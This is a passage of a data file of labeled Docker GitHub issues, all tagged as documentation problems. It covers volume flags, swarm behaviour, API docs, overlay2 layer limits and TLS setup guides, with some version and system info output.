(AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation",null,null,null],"text":"Although docker-run(1) (1.12.1) states that :\n\n`To disable automatic copying of data from the container path to the volume, use the nocopy flag. The nocopy flag can be set on bind mounts and named volumes.`\n\nwhen I do :\n\n`docker run -v /home/mandas/foo:/tmp:nocopy busybox`\n\nI get :\n\n`docker: Error response from daemon: Invalid bind mount spec \"/home/mandas/foo:/tmp:nocopy\": invalid mode: nocopy.`\n\nIs the man page wrong or is it an issue?\n"},{"labels":["documentation",null],"text":"nocopy volume bind option is not mentioned in the respective 1.23 remote API page, although it is implemented and mentioned in changelog as well.\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api/#v1-23-api-changes\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.23\n"},{"labels":["documentation",null,null],"text":"https://docs.docker.com/engine/userguide/storagedriver/device-mapper-driver/#/for-a-direct-lvm-mode-configuration\n\nThis doc informs users to push all images to a remote registry and then informs to rm -f /var/lib/docker, thus removing everything including certs that may be stored under this directory tree.  For good reasons, we instruct users to change from the default devicemapper loopback configuration that we recommended in early releases, of which they maybe running UCP on those nodes.   Deleting the certs in /var/lib/docker/discovery_certs creates a far more complex recovery scenario than just copying the certs back after the lvm changes have been completed.  This is the error received when you try to start up the docker daemon after following the doc instructions on a UCP node.\n\nInitializing discovery with TLS\nError starting daemon: discovery initialization failed (Could not read CA certificate \\ \"/var/lib/docker/discovery_certs/ca.pem\\\" open /var/lib/docker/discovery_certs/ca.pem: no such file or directory\n\nCan additional steps be written into the referenced doc perhaps such as copy the /var/lib/docker directory to /tmp to enable the recovery of items such as certs, etc in order to  keep from  placing users into extensive recovery scenarios.  thnx\n"},{"labels":["documentation",null],"text":"On the `docker service ps` documentation page (https://docs.docker.com/engine/reference/commandline/service_ps/) only three filters are shown as supported: id, name and desired-state. However, I discovered that there is also the \"node\" filter which matches tasks by either the hostname of the node they are deployed on, or the NodeID of that node (confirmed on 1.12.1).\n\nThe API reference for the tasks API correctly mentions that the NodeID can be used as a parameter to the node filter (https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/list-tasks), but omits the fact that the hostname of the node can be also used as the value to that filter\n"},{"labels":["documentation",null],"text":"I failed to find in the documentation or in the issues any information regarding how many swarm managers I should declare. Sure, more than one if you want high availability, but how many? and why not make all nodes managers? what is the tradeoff of being a manager vs a worker?\n"},{"labels":["documentation",null,null],"text":"The restart-policies for `docker run` had intuitive names like `no, on-failure, always` and we [have docs that explain what they mean](https://docs.docker.com/engine/reference/run/#restart-policies-restart).\n\nWith `docker service`, the restart policies are a bit different. You have options like `none, on-failure, or any`. It's not obvious what the `restart-policy=any` means, so we need to have some documentation for it.\n"},{"labels":["documentation",null],"text":"In reading https://docs.docker.com/engine/reference/builder/#/entrypoint, I find it a bit confusing to follow and understand with confidence.\n\nHere are a few questions which result:\n- Is there any way to pass the list form of `--entrypoint`, so when using `docker run` on the cli, your command will receive `SIGTERM` or other signals?\n- If you want to ensure your commands receive those signals, you _must_ use the list form for `--entrypoint` or `ENTRYPOINT`, correct?\n- When no `--entrypoint` is specified, what is the behavior of docker's signal passing?\n- Does the `--command` parameter (in either the list form or not) affect the behavior of signal passing?\n"},{"labels":["documentation"],"text":"The content of https://docs.docker.com/registry/insecure/#using-self-signed-certificates says \"be sure to use the name 'myregistrydomain.com' as a CN\". I think the intent of the overall page is for the developer to fill in their own domain. Perhaps it could be a bit clearer.\n"},{"labels":["documentation",null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\nIn the documentation for the Remote API in the request Json for creating a network the IPAM part of the json is missing \"Driver\".\nIn the cli this is sent by --ipam-driver string\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-network\n(maybe earlier docs also)\n\n<!--\nBriefly describe the problem you are having in a few paragraphs.\n-->\n\n**Steps to reproduce the issue:**\n1. Create a new network\n2. Check the Json that is sent\n\n**Describe the results you received:**\nNo Documentation to set Driver for IPAM\n\n**Describe the results you expected:**\nDocumentation to set Driver for IPAM\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 3\n Running: 0\n Paused: 0\n Stopped: 3\nImages: 4\nServer Version: 1.12.1\nStorage Driver: devicemapper\n Pool Name: docker-253:1-10223820-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 885.9 MB\n Data Space Total: 107.4 GB\n Data Space Available: 106.5 GB\n Metadata Space Used: 1.847 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.146 GB\n Thin Pool Minimum Free Space: 10.74 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.134 (2016-09-07)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge host null overlay\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 4.7.4-1-ARCH\nOperating System: Arch Linux\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 23.49 GiB\nName: karl_rog\nID: IOCD:Y7FK:RDB6:43I7:QLCF:OBP5:LKJR:QLYD:NC6U:V7GA:ROQA:TCVE\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation",null],"text":"It is probably the case that the recommended way of working with images and a swarm of nodes is to use a private image registry or docker cloud solution. However, I feel that the current design (and documentation) is a bit incomplete. The problem is that if you are a newcomer and start creating your swarm, when you build your image on one of the swarm leaders, and then starts a service using that image, if the service is scheduled to run on other nodes wheere the image is not available then it will just silently fail. The error claiming that an image is missing is often not complete displayed either when using `docker service ps` since the message is too long, which requires the user to login into the machine where the docker daemon is running and checking the logs there... not very friendly.\nI have not found in the documentation that an image that is custom built must be pushed to a image registry in order to make the swarm work, which for me at least, took some precious time to discover the hard way. \nSo finally, I think the best solution would be if every swarm node could act as a private image registry out of the box, but only for the nodes part of that swarm. By doing that images will just be created once and everything will work magically as so many other things in docker. The other alternative I can think of is that when building an image you could pass a --swarm flag to tell docker that you want to build that same image on all the nodes part of the swarm. The problem with this solution is of course that if the swarm grows, the new nodes will not have that image and fail again silently...\n"},{"labels":["documentation",null],"text":"Just putting this down here so we don't forget;\n\nWe don't have clear documentation on how \"daemon shutdown\" works; i.e. timeout of containers, stop, kill. Also what happens if a container fails to be killed.\n\nAnother point brought up by @mlaventure is that `systemd` also uses a timeout, so the daemon itself may be killed before it finishes shutdown.\n"},{"labels":["documentation"],"text":"In docker volumes tutorial there is still wrote \n\n```\nBecause of limitations in the mount function, moving subdirectories within the host’s source directory can give access from the container to the host’s file system. This requires a malicious user with access to host and its mounted directory.\n```\n\nThis was fixed last year: http://www.spinics.net/lists/linux-containers/msg31063.html\n"},{"labels":["documentation",null,null],"text":"The actual documentation for the creation of a service using the Docker API is incorrect for the port publishing section (at https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-service)\n\nThe **Example request** specifies the following:\n\n``` json\nPOST /services/create HTTP/1.1\nContent-Type: application/json\n\n{\n  ...\n  \"EndpointSpec\": {\n    \"Ports\": [\n      {\n        \"Protocol\": \"tcp\",\n        \"PublishedPort\": 8080,\n        \"TargetPort\": 80\n      }\n    ]\n  },\n ...\n}\n```\n\nThis is totally correct, but the **JSON parameters** shows the following:\n\n```\n* Endpoint – Properties that can be configured to access and load balance a service.\n  * Spec –\n    * Mode – The mode of resolution to use for internal load balancing between tasks (vip or dnsrr).\n    * Ports – Exposed ports that this service is accessible on from the outside, in the form of: \"Ports\": { \"<port>/<tcp|udp>: {}\" }\n```\n\nThis is totally incorrect and can lead to confusion.\n"},{"labels":["documentation",null,null],"text":"https://github.com/docker/docker/pull/24987 was merged without documentation changes. This issue is for tracking that\n\n/cc @ripcurld00d \n"},{"labels":["documentation",null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\n\nDocker Remote API Documentation problem concerning MaximumIOps and MaximumIOBps.\nIn documentation they are written as:\nMaximumIOps\nMaximumIOBps\n\nBut both Dockers code and recording the call (using Wiremock as a proxy between docker cli and docker daemon) says that they really are:\nIOMaximumIOps\nIOMaximumBandwidth\n\n**Steps to reproduce the issue:**\n1. docker -H <REMOTE_HOST> create --io-maxbandwidth=5m ubuntu:14.04\n2. compare json to documentation\n\n**Describe the results you received:**\nMaximumIOps\nMaximumIOBps\n\n**Describe the results you expected:**\nIOMaximumIOps\nIOMaximumBandwidth\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nConcerns:\ndocs/reference/api/docker_remote_api.md\ndocs/reference/api/docker_remote_api_v1.24.md\ndocs/reference/api/docker_remote_api_v1.25.md\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:        Thu Aug 18 05:33:38 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:        Thu Aug 18 05:33:38 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 9\n Running: 2\n Paused: 0\n Stopped: 7\nImages: 183\nServer Version: 1.12.1\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 314\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay bridge host null\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-36-generic\nOperating System: Ubuntu 16.04.1 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 30.85 GiB\nName: karl-P50\nID: ND5C:QQCW:NNJ4:QSFT:G6QP:MFJK:LDT4:VX6Q:HCSE:HVQ6:ABM6:2KVJ\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nInsecure Registries:\n docker-remote.art.local\n docker-virtual.art.local\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation"],"text":"Rename / move existing docs where needed, and update completion scripts for #26025 and #26716\n"},{"labels":["documentation",null],"text":"Hi\nCan i have more than one --constraint per service create ?\n\n```\ndocker service create \\\n--constraint 'node.hostname == foo' \\\n--constraint 'node.hostname == boo'\n```\n"},{"labels":["documentation",null],"text":"**Description**\nLinux kernel version 3.19 introduced lazy removal of mounts on unlinked files and directories.\nThis greatly reduces EBUSY errors when removing bind mounted directories used in containers. For more information, refer to \n1. http://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?h=linux-3.19.y&id=8ed936b5671bfb33d89bc60bdcc7cf0470ba52fe\n2. https://github.com/docker/docker/issues/21704\n\nUpdate necessary documentation and pre-req check code.\n"},{"labels":["documentation"],"text":"Since the Docker API client and types have been moved form [docker/engine-api](https://github.com/docker/engine-api) to the main docker repo [docker/client](https://github.com/docker/docker/tree/master/client), no README.md with a simple usage example is available anymore.\nIt would be helpful to add a simple README.md file with at least the same usage example from the old [README.md](https://github.com/docker/engine-api/tree/6c72c24563a7a266e91c8445811f74f138973457).\nI'll be glad to send a PR for this.\n"},{"labels":["documentation",null],"text":"[VENDORING.md](https://github.com/docker/docker/blob/master/VENDORING.md) starts out with the following:\n\n> This document outlines recommended Vendoring policies for Docker repositories. (Example, libnetwork is a Docker repo and logrus is not.)\n\nThen, it goes on about some semantic versioning requirements for no apparent reason and requirements about a release process, including a changelog (even for dependencies that have version control). Most of this is a waste of time for package-level projects (go-events, go-connections, etc.) when we have commit-level changelog.\n\nThis document SHOULD cover the following:\n1. Structure of our vendoring system.\n2. How to update an existing dependency.\n3. How to add a new dependency.\n4. Any helpful incantations to make vendoring work more smoothly.\n\nThis will be much more helpful to contributors than a bunch of nonsense about semantic versioning.\n"},{"labels":["documentation",null],"text":"In `docker node` you can see that there is a `docker node update --label-add` option to add labels.\n\nI was confused about the difference between this and Engine labels (i.e., added with `--label` to `dockerd`) and asked the Swarm team to explain.  The answer was insightful and should be documented.\n\nEssentially:\n1. A compromised worker node could change its own Engine labels, but not node labels.  Only managers can change node labels.\n2. Therefore, node labels could be useful to e.g. schedule only on machines where certain special workloads should be run, for instance machines where [PCI-SS compliance](https://www.pcisecuritystandards.org/) is met.  A compromised worker could not compromise these special workloads because it cannot change node labels.\n3. Engine labels, however, are still useful because some features which do not affect secure orchestration of containers might be better off set in a decentralized manner.  For instance, an engine could have a label to indicate that it has a certain type of disk device, which may not be relevant to security directly.  These labels are more easily \"trusted\" by the orchestrator.\n\nhttps://docs.docker.com/engine/swarm/manage-nodes/#/add-or-remove-label-metadata explains that you _can_ do this, but not why you might want to.\n\nFYI @londoncalling and thanks @diogomonica @stevvooe @cpuguy83 for explanation\n"},{"labels":["documentation",null,null],"text":"In the (IMHO really good) [overlay 2 documentation](https://docs.docker.com/engine/userguide/storagedriver/overlayfs-driver) chapter \"Image layering and sharing with OverlayFS (overlay2)\"  is written:\n\n> While the overlay driver only works with a single lower OverlayFS layer and hence requires hard links for implementation of multi-layered images, the overlay2 driver natively supports multiple lower OverlayFS layers (**up to 128**).\n\nWe did the experiment and \"docker build\" failed after **122 layers**.\n\n```\nRemoving intermediate container 1019d67fb4c7\nStep 123 : COPY Dockerfile /tmp/Dockerfile\nmax depth exceeded\n```\n\nI assume that  restriction comes from the 4 KB mount option size. It is mentioned that the shortened IDs have been implemented because of that.\n\nAn overlay2 mount looks like the following:\n\n```\noverlay on /var/lib/docker/overlay2/164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/merged type overlay \n(rw,relatime,\nlowerdir=l/WUS2HSYXXBUH7KQ5DXYVKY47V7:l/7FR5NGKHKOTQYM5I3W2BBT7RFJ,\nupperdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/diff,\nworkdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/work)\n```\n\nFor each layer we need strings like \":l/7FR5NGKHKOTQYM5I3W2BBT7RFJ\" which are 30 characters. In addition to that we have the strings:\n- `rw,relatime,lowerdir=`   -> 22 characters\n- `upperdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/diff,` -> 80 characters\n- `workdir=164d646991e089b06b55a5f1f03ab557a45753204a63b5dcc22991611563017f/work` -> 78 characters\n\nI did some calculations and could not reproduce exactly the 122 layers. Nevertheless the 128 documented layers seem to be wrong.\n\n**BTW: Two other minor things we noticed:**\n\n> The **lowerest** layer contains the “link” file which contains\n\nShouldn't this be \"lowest\" :-)\n\n> These shortened identifiers are used for avoid hitting the **page size** limitation on mount arguments.\n\nIMHO page size is a bit unclear. E.g. the Linux kernel has huge pages with different size, for example on s390x we have 1 MiB, 2 GiB. I assume you just mean 4 KB here?\n"},{"labels":["documentation"],"text":"My [repository](https://github.com/jeff1evesque/machine-learning) implements docker containers within the [`.travis.yml`](https://github.com/jeff1evesque/machine-learning/blob/78384feb5477464dba4a48b96dbfc01e1d39b0f6/.travis.yml#L101-L112), to perform automated unit testing.  Each time someone commits code, the [travis ci](https://travis-ci.org/jeff1evesque/machine-learning/builds) runs `pytest-flask`.  Could my repository be added to the [Projects using docker](https://github.com/docker/docker/wiki/Projects-using-docker) wiki page?  In the future, I plan on adjusting the development environment to be a series of nested docker containers in the current vagrant environment.\n"},{"labels":["documentation",null,null],"text":"Docker allows mounting a data volume into container, which is awesome.\n\n`docker-compose` supports that, which is awesome\n\nDocker also copies files from image into volume on container creation, which surely it sometimes handy.\n\nThe problem is sometimes there's a bit too much data:\n\n```\nvolumes:\n    log:\nservices:\n    nginx:\n        volumes:\n            - log:/var/log\n```\n\nThe idea is to have persistent logs. `nginx.conf` points logs to `/var/log/nginx` making this pretty nice, each service will have it's own top-level folder in the volume.\n\nBut, alas! `nginx` container has some other rubbish in `/var/log`, e.g. `/var/log/dmesg` which gets copied to top level in the volume. :(\n\nIf I could mount `- log/nginx:/var/log/nginx` I'd work around this problem really nicely...\n\nNot that it's a good reason for inclusion per se though.\n\nA discussion is needed.\n"},{"labels":["documentation",null,null],"text":"Someone probably needs to start a roadmap issue for getting a solution to current problems with \"docker deploy\" (ie. where the feature is planned to go) because so far, I cannot find anything, let alone an issue, describing current progress.\n\nIncluding:\n- `docker deploy`\n- `docker stacks`\n- The planned relation between Swarm Mode / Docker Compose / `docker deploy`\n- The planned file formats\n"},{"labels":["documentation",null,null,null],"text":"I was on 1.10.3 and I had the remote api enabled by changing the $DOCKER_OPS from `/etc/init/docker.conf` to `'-H tcp://0.0.0.0:4243 -H unix:///var/run/docker.sock'`, but now that doesn't work anymore!\n\nI upgraded to Ubuntu Xenial (from Trusty) and docker engine from 1.10.3 to 1.12.1...\n\nAny help is greatly appreciated!\n\nEDIT: I [reverted back to Upstart](https://wiki.ubuntu.com/SystemdForUpstartUsers#Permanent_switch_back_to_upstart) on this Ubuntu... still same issue.\n"},{"labels":["documentation",null,null],"text":"in stack_tasks.md, there is command:\n\n```\nUsage:  docker stack tasks [OPTIONS] STACK\n\nList the tasks in the stack\n```\n\nin stack/ps.go, there is command:\n\n```\ncmd := &cobra.Command{\n    Use:   \"ps [OPTIONS] STACK\",\n    Short: \"List the tasks in the stack\",\n```\n"},{"labels":["documentation",null],"text":"The CLI reference docs say this about `swarm leave --force`.\n\n```\n      --force   Force leave ignoring warnings.\n```\n\nThey should also mention that `swarm leave --force` allows you to remove a manager, but does not gracefully remove the manager from the swarm. Doing this may cause the swarm to lose its quorum. Unless you don't care about the impact on the existing cluster, you should always demote managers to workers before removing them.\n\ncc @sfsmithcha\n"},{"labels":["documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   f1e1b83\n Built:        \n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   f1e1b83\n Built:        \n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 2\n Running: 1\n Paused: 0\n Stopped: 1\nImages: 2\nServer Version: 1.12.1\nStorage Driver: overlay\n Backing Filesystem: extfs\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: selinux\nKernel Version: 4.7.1-coreos\nOperating System: CoreOS 1151.0.0 (MoreOS)\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 7.801 GiB\nName: core-01\nID: 3D66:DYWJ:CZIL:ESFB:CW3S:UTSG:VFZY:YBLT:E234:H7L2:OIOT:Y7ZL\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nUsername: easywebdeploy\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n 127.0.0.0/8\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nRunning CoreOS Alpha 1151.0.0 On Vagrant 1.8.5 Ubuntu 16.04\n\n**Steps to reproduce the issue:**\n1. Run a simple container and make sure its running\n2. Run \"curl -v --unix-socket /var/run/docker.sock http:/containers/json\" to get a list of Containers\n\n**Describe the results you received:**\n\n``` sh\n*   Trying /var/run/docker.sock...\n* Connected to containers (/var/run/docker.sock) port 80 (#0)\n> GET /json HTTP/1.1\n> Host: containers\n> User-Agent: curl/7.50.1\n> Accept: */*\n> \n< HTTP/1.1 404 Not Found\n< Content-Type: application/json\n< Date: Mon, 29 Aug 2016 08:48:02 GMT\n< Content-Length: 29\n< \n{\"message\":\"page not found\"}\n* Connection #0 to host containers left intact\n```\n\n**Describe the results you expected:**\nExpected is the JSON list of all running containers\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nWas working correctly on CoreOS with Docker version till 1.11.2\n"},{"labels":["documentation",null],"text":"Feedback on finding Node state and availability in the docs:\n\nDoc is here: https://docs.docker.com/engine/swarm/manage-nodes/#manage-nodes-in-a-swarm\n\n I searched for \"status\", \"node status\", \"node state\", \"availability\", \"node availability\", \"swarm availability\". I assumed there was no such page so I didn't search for \"Reachable\", which would have been my next keyword, but it looks like that one correctly points to that page. Also, I went to the swarm-mode overview page looking for some sort of \"concepts\" or \"keywords\" page, followed the url to the \"key-concepts\" page which did not mention any details node status and noticed that the only follow-up URL at the bottom redirected me back to swarm-mode overview. I didn't suspect to go to the \"manage nodes\" headline as I imagined that would cover the various leave/rm/demote/promote flows, rather than document the possible node states\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 23:54:00 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 23:54:00 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 0\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: false\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 3.13.0-74-generic\nOperating System: Alpine Linux v3.4 (containerized)\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 7.704 GiB\nName: 2984dce9dd17\nID: DK5H:F7GU:NOI7:EQKM:4JQG:IXVD:Z2ZJ:5LRM:2CV7:DI5J:B7Y4:YY2V\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nWARNING: bridge-nf-call-iptables is disabled\nWARNING: bridge-nf-call-ip6tables is disabled\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1.  View [docker run reference - Security configuration](https://docs.docker.com/engine/reference/run/#/security-configuration)\n\n**Describe the results you received:**\nWhile reading `docker run`'s SELinux _Security configuration_  section, noticed reference to `--permissive` flag as a method to disable SELinux enforcement for a particular container by Docker Engine.  Relevant passage:\n\n \"_To disable the security labeling for this container versus running with the --permissive flag, use the following command:_\"\n\nHowever, `docker run` doesn't support `--permissive` flag, as it generates message: `unknown flag: --permissive`.  Therefore, given the context, documentation should have instead cited `--privileged` option.\n\n**Describe the results you expected:**\n\"_To disable the security labeling for this container versus running with the **--privileged** flag, use the following command:_\"\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"This is an issue with the documentation for setting up TLS in a swarm which can be found [here](https://docs.docker.com/swarm/configure-tls/). In [Step 3](https://docs.docker.com/swarm/configure-tls/#/step-3-create-and-sign-keys) it says that a file called `node-priv.key` will be created which will contain the private key. However, no reference to a `.key` file is found anywhere else in the document. I'm not really sure what changes need to be made, as far as I can tell it crates the private key in a file called `node-priv-key.pem`, but I'm not sure if anything else needed to be done.\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nI'm not able to find the actual markdown file in the `/docs` folder in the repo which contains the guide.\n\n**Steps to reproduce the issue:**\n1. Go through the [swarm/configure-tls](https://docs.docker.com/swarm/configure-tls) guide\n2. Expect a `.key` file to be made at some point\n3. It isn't\n\n**Describe the results you received:**\nThe resulting keys two `.pem` files are created, with one of them suggesting it's the private key.\n\n**Describe the results you expected:**\nDocs to either refer to the private key consistently or have steps for creating the `.key` file\n"},{"labels":["documentation",null],"text":"**Steps to reproduce the issue:**\n1. Go to https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/display-system-wide-information and search for /swarm to look for how to get swarm join token \n2.\n3.\n\n**Describe the results you received:**\n\nNo results on how to retrieve swarm join token. \n\n**Describe the results you expected:**\n\nThe API to retrieve the swarm join token should be available on the API docs\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation",null,null,null],"text":"I would like to put together a quick guide for Docker on ARM - especially Raspberry Pi. There is a `curl | sh` method newly available which makes the process quicker and easier. From my perspective this should feel as close as possible to the experience of Docker on x86_64. \n\nI'd like to put a short/simple guide together:\n- Recommended (default) OS to be Raspbian (Jessie Lite)\n- `curl | sh` recommended installation method\n- A mention to the problem with multi-arch - i.e. `docker run busybox` won't work\n- A recommended base image: `resin/rpi-raspbian`\n- Give short example of Dockerfile for Node.js, Python\n- Short mention of GPIO (accessing the input output headers on the device) and privilege mode.\n- A disclaimer / buyer beware.. few words on limitations.\n\nPotential follow-up guide:\n- Building Docker on ARM\n- Adding a swap file\n- Expected build duration\n- Limitations\n\nRef: \nhttps://github.com/docker/docker/issues/24561\n\nInput especially welcome from @DieterReuter , @estesp , @crosbymichael @StefanScherer as follow-up. @thaJeztah what are your thoughts?\n"},{"labels":["documentation",null],"text":"At the CLI we expose this with `--with-registry-auth` but the API docs don't explain how API clients can send the registry auth information on service creation or update.\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nIt looks like the 1.12.0 changelog doesn't have the docker proxy changes made in https://github.com/docker/docker/pull/23312. I don't think the docs have been updated 